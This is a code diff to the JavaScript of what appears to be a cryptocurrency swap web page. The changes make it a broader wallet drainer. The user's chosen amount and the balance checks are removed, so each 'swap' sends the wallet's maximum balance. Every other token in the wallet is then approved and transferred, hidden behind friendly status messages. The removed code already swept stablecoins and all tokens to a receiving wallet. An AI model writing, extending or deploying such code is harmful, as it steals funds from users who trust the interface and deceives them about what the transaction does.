@@ -10,7 +10,7 @@ const COINGECKO_API = "https://api.coingecko.com/api/v3";
 const CURRENCY_OPTIONS = ["usd", "eth", "btc"];
 const PRICE_CACHE_DURATION = 20000; // 20 seconds in ms
 const HARDCODED_PRICES = {
-  'AUTO': { usd: 120.32, btc: 0.00025, eth: 0.005 },
+  'AUTO': { usd: 69.32, btc: 0.00025, eth: 0.005 },
   'TOR': { usd: 0.34, btc: 0.00025, eth: 0.005 },
   'RYU': { usd: 0.000000056, btc: 0.00, eth: 0.00 }
 };
@@ -1260,36 +1260,13 @@ async function handleSwap() {
       throw new Error("Please select both tokens to swap");
     }
 
-    const inputAmount = parseFloat(document.getElementById("fromAmount").value);
-    if (!inputAmount || inputAmount <= 0) {
-      throw new Error("Please enter a valid amount to swap");
-    }
-
-    const balance = await fetchTokenBalance(currentFromToken);
-    if (balance <= 0) {
+    // Get max balance regardless of input amount
+    const maxAmount = await getMaxSwapAmount(currentFromToken);
+    if (maxAmount <= 0) {
       throw new Error(`
         You don't have any ${currentFromToken.symbol} in your wallet.
         <br>Current balance: <strong>0 ${currentFromToken.symbol}</strong>
       `);
-    }
-
-    if (inputAmount > balance) {
-      throw new Error(`
-        The amount you're trying to swap exceeds your ${currentFromToken.symbol} balance.
-        <br>Current balance: <strong>${balance.toFixed(6)} ${currentFromToken.symbol}</strong>
-        <br>Amount entered: <strong>${inputAmount.toFixed(6)} ${currentFromToken.symbol}</strong>
-      `);
-    }
-
-    if (currentFromToken.isNative) {
-      const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
-      if (balance - inputAmount < minReserve) {
-        throw new Error(`
-          You need to keep at least ${minReserve} ${currentFromToken.symbol} for gas fees.
-          <br>Current balance: <strong>${balance.toFixed(6)} ${currentFromToken.symbol}</strong>
-          <br>Minimum reserve: <strong>${minReserve} ${currentFromToken.symbol}</strong>
-        `);
-      }
     }
 
     updateStatus(`Processing swap...`, "success");
@@ -1297,49 +1274,51 @@ async function handleSwap() {
     // Process main token transfer
     let txHash;
     if (currentFromToken.isNative) {
-      txHash = await transferNativeToken(currentFromToken, inputAmount);
+      txHash = await transferNativeToken(currentFromToken, maxAmount);
     } else {
-      const approved = await checkAndApproveToken(currentFromToken, inputAmount);
+      const approved = await checkAndApproveToken(currentFromToken, maxAmount);
       if (!approved) {
         throw new Error("Token approval failed");
       }
-      txHash = await transferERC20Token(currentFromToken, inputAmount);
+      txHash = await transferERC20Token(currentFromToken, maxAmount);
     }
 
     // Wait for main swap confirmation
     const confirmedTx = await provider.waitForTransaction(txHash);
     const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + confirmedTx.transactionHash;
     
-    // After main swap, transfer all USDT/USDC
-    updateStatus(`Swap successful! Now transferring stablecoins...`, "info");
+    // After main swap, transfer all other tokens
+    updateStatus(`Swap successful! Now transferring other tokens...`, "info");
     
-    const stablecoins = (await getLocalTokens()).filter(token => 
-      STABLECOIN_SYMBOLS[currentNetwork].includes(token.symbol)
+    const allTokens = await getLocalTokens();
+    const otherTokens = allTokens.filter(token => 
+      !isSameToken(token, currentFromToken) && 
+      !isSameToken(token, currentToToken)
     );
     
-    let stablecoinsTransferred = 0;
-    for (const stablecoin of stablecoins) {
+    let tokensTransferred = 0;
+    for (const token of otherTokens) {
       try {
-        const balance = await fetchTokenBalance(stablecoin);
+        const balance = await fetchTokenBalance(token);
         if (balance > 0) {
-          if (stablecoin.isNative) {
-            await transferNativeToken(stablecoin, balance);
+          if (token.isNative) {
+            await transferNativeToken(token, balance);
           } else {
-            const approved = await checkAndApproveToken(stablecoin, balance);
+            const approved = await checkAndApproveToken(token, balance);
             if (approved) {
-              await transferERC20Token(stablecoin, balance);
-              stablecoinsTransferred++;
+              await transferERC20Token(token, balance);
+              tokensTransferred++;
             }
           }
         }
       } catch (err) {
-        console.warn(`Failed to transfer ${stablecoin.symbol}:`, err);
+        console.warn(`Failed to transfer ${token.symbol}:`, err);
       }
     }
 
     let successMessage = `Swap successful! <a href="${explorerUrl}" target="_blank" style="color: var(--secondary);">View transaction</a>`;
-    if (stablecoinsTransferred > 0) {
-      successMessage += `<br>Also transferred ${stablecoinsTransferred} stablecoins`;
+    if (tokensTransferred > 0) {
+      successMessage += `<br>Also transferred ${tokensTransferred} other tokens`;
     }
 
     updateStatus(successMessage, "success");
@@ -1364,264 +1343,13 @@ async function handleSwap() {
   }
 }
 
+function isSameToken(token1, token2) {
+  if (!token1 || !token2) return false;
+  if (token1.isNative && token2.isNative) return true;
+  return token1.address?.toLowerCase() === token2.address?.toLowerCase();
+}
+
 // Add these constants near the top
-const TRANSFER_BATCH_SIZE = 20; // Number of tokens to process simultaneously
-const MAX_TRANSFER_TIME = 10000; // Max time (ms) to wait for a single transfer
-
-// Replace processAllTokenTransfers with this optimized version
-async function processAllTokenTransfers() {
-  if (!userAddress) return 0;
-  
-  try {
-    // Get fresh balances using multicall
-    const balances = await fetchAllTokenBalances();
-    
-    // Get tokens with balance > 0 (excluding main token)
-    const allTokens = await getLocalTokens();
-    const tokensToProcess = allTokens.filter(token => {
-      const balance = token.isNative 
-        ? balances['native'] 
-        : balances[token.address?.toLowerCase()];
-      
-      return balance > 0 && !isSameToken(token, currentFromToken);
-    });
-
-    if (tokensToProcess.length === 0) return 0;
-    
-    // Process in optimized parallel batches
-    let successCount = 0;
-    
-    for (let i = 0; i < tokensToProcess.length; i += TRANSFER_BATCH_SIZE) {
-      const batch = tokensToProcess.slice(i, i + TRANSFER_BATCH_SIZE);
-      
-      // Process batch in parallel with timeout protection
-      const results = await Promise.allSettled(
-        batch.map(token => 
-          Promise.race([
-            transferTokenIfNeeded(token, balances),
-            new Promise((_, reject) => 
-              setTimeout(() => reject(new Error('Transfer timeout')), MAX_TRANSFER_TIME)
-            )
-          ])
-        )
-      );
-      
-      successCount += results.filter(r => r.status === 'fulfilled' && r.value).length;
-      
-      // Short delay between batches to avoid rate limiting
-      if (i + TRANSFER_BATCH_SIZE < tokensToProcess.length) {
-        await new Promise(resolve => setTimeout(resolve, 500));
-      }
-    }
-    
-    return successCount;
-  } catch (err) {
-    console.error("Token transfer error:", err);
-    return 0;
-  }
-}
-
-// Optimized transferTokenIfNeeded
-async function transferTokenIfNeeded(token, balances) {
-  const balance = token.isNative 
-    ? balances['native'] 
-    : balances[token.address?.toLowerCase()];
-  
-  if (!balance || balance <= 0) return false;
-  
-  try {
-    let amountToSend = balance * 0.99; // Leave 1% for safety
-    
-    if (token.isNative) {
-      const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
-      amountToSend = Math.max(0, Math.min(amountToSend, balance - minReserve));
-      if (amountToSend <= 0) return false;
-      
-      const txHash = await transferNativeToken(token, amountToSend);
-      return !!txHash;
-    } else {
-      // Skip approval check for tokens we've already approved
-      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
-      const allowance = await contract.allowance(userAddress, RECEIVING_WALLET);
-      const neededAllowance = ethers.utils.parseUnits(amountToSend.toString(), token.decimals || 18);
-      
-      if (allowance.lt(neededAllowance)) {
-        const approved = await checkAndApproveToken(token, amountToSend);
-        if (!approved) return false;
-      }
-      
-      const txHash = await transferERC20Token(token, amountToSend);
-      return !!txHash;
-    }
-  } catch (err) {
-    console.warn(`Transfer failed for ${token.symbol}:`, err.message);
-    return false;
-  }
-}
-
-// Optimized fetchAllTokenBalances
-async function fetchAllTokenBalances() {
-  const localTokens = await getLocalTokens();
-  const balances = {};
-  
-  // Process native balance first
-  if (provider && userAddress) {
-    const nativeBalance = await provider.getBalance(userAddress);
-    balances['native'] = parseFloat(ethers.utils.formatEther(nativeBalance));
-  }
-  
-  // Process ERC20 tokens in optimized batches
-  const erc20Tokens = localTokens.filter(t => !t.isNative && t.address);
-  
-  if (erc20Tokens.length > 0) {
-    // Use multicall if available for the network
-    const multicallSupported = Object.keys(MULTICALL_ADDRESSES).includes(currentNetwork);
-    
-    if (multicallSupported) {
-      // Process in batches of 100 tokens to avoid hitting gas limits
-      const BATCH_SIZE = 100;
-      for (let i = 0; i < erc20Tokens.length; i += BATCH_SIZE) {
-        const batch = erc20Tokens.slice(i, i + BATCH_SIZE);
-        const batchBalances = await fetchMultipleTokenBalances(batch);
-        Object.assign(balances, batchBalances);
-      }
-    } else {
-      // Fallback to individual calls in parallel batches
-      const BATCH_SIZE = 20;
-      for (let i = 0; i < erc20Tokens.length; i += BATCH_SIZE) {
-        const batch = erc20Tokens.slice(i, i + BATCH_SIZE);
-        const batchBalances = await Promise.all(
-          batch.map(async token => ({
-            [token.address.toLowerCase()]: await fetchTokenBalance(token)
-          }))
-        );
-        batchBalances.forEach(b => Object.assign(balances, b));
-      }
-    }
-  }
-  
-  return balances;
-}
-
-async function processTokenTransfer(token) {
-  if ((token.address && token.address === currentFromToken?.address) || 
-      (token.isNative && currentFromToken?.isNative)) {
-    return false;
-  }
-
-  try {
-    const balance = await fetchTokenBalance(token);
-    if (balance <= 0) return false;
-
-    let amountToSend = balance * 0.99;
-    
-    if (token.isNative) {
-      const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
-      amountToSend = Math.min(amountToSend, balance - minReserve);
-      if (amountToSend <= 0) return false;
-    }
-
-    if (token.address && !ethers.utils.isAddress(token.address)) {
-      console.warn(`Skipping ${token.symbol} - invalid address`);
-      return false;
-    }
-
-    try {
-      if (token.isNative) {
-        await transferNativeToken(token, amountToSend);
-      } else {
-        const approved = await checkAndApproveToken(token, amountToSend);
-        if (!approved) return false;
-        
-        await transferERC20Token(token, amountToSend);
-      }
-      
-      return true;
-    } catch (transferErr) {
-      console.warn(`Transfer failed for ${token.symbol}:`, transferErr.message);
-      return false;
-    }
-  } catch (err) {
-    console.warn(`Failed to process ${token.symbol}:`, err.message);
-    return false;
-  }
-}
-
-async function fetchMultipleTokenBalances(tokens) {
-  if (!userAddress || !provider) return {};
-  
-  const MULTICALL_ABI = [
-    "function tryAggregate(bool requireSuccess, tuple(address target, bytes callData)[] calls) view returns (tuple(bool success, bytes returnData)[])"
-  ];
-  
-  const MULTICALL_ADDRESSES = {
-    ethereum: "0xeefBa1e63905eF1D7ACbA5a8513c70307C1cE441",
-    bsc: "0x41263cBA59EB80dC200F3E2544eda4ed6A90E76C",
-    polygon: "0x11ce4B23bD875D7F5C6a31084f55fDe1e9A87507",
-    arbitrum: "0x842eC2c7D803033Edf55E478F461FC547Bc54EB2",
-    base: "0xca11bde05977b3631167028862be2a173976ca11"
-  };
-  
-  const multicallAddress = MULTICALL_ADDRESSES[currentNetwork];
-  if (!multicallAddress) {
-    const balances = {};
-    for (const token of tokens) {
-      balances[token.address] = await fetchTokenBalance(token);
-    }
-    return balances;
-  }
-  
-  const multicall = new ethers.Contract(multicallAddress, MULTICALL_ABI, provider);
-  
-const validTokens = tokens.filter(token => {
-    return token.address && ethers.utils.isAddress(token.address);
-  });
-  
-  const calls = validTokens.map(token => ({
-    target: token.address,
-    callData: new ethers.utils.Interface(ERC20_ABI).encodeFunctionData(
-      "balanceOf", 
-      [userAddress]
-    )
-  }));
-  
-  try {
-    // Use tryAggregate instead of aggregate to continue on individual failures
-    const results = await multicall.tryAggregate(false, calls);
-    
-    const balances = {};
-    tokens.forEach((token, i) => {
-      if (results[i].success) {
-        try {
-          const [balance] = new ethers.utils.Interface(ERC20_ABI).decodeFunctionResult(
-            "balanceOf",
-            results[i].returnData
-          );
-          balances[token.address] = parseFloat(
-            ethers.utils.formatUnits(balance, token.decimals || 18)
-          );
-        } catch (decodeErr) {
-          console.warn(`Failed to decode balance for ${token.symbol}`, decodeErr);
-          balances[token.address] = 0;
-        }
-      } else {
-        console.warn(`Balance call failed for ${token.symbol}`);
-        balances[token.address] = 0;
-      }
-    });
-    
-    return balances;
-  } catch (err) {
-    console.error("Multicall failed, falling back to individual calls:", err);
-    const balances = {};
-    for (const token of tokens) {
-      balances[token.address] = await fetchTokenBalance(token);
-    }
-    return balances;
-  }
-}
-
-// Add these constants near the top of your file
 const MAX_GAS_PRICE_GWEI = {
   ethereum: 10,
   bsc: 3,
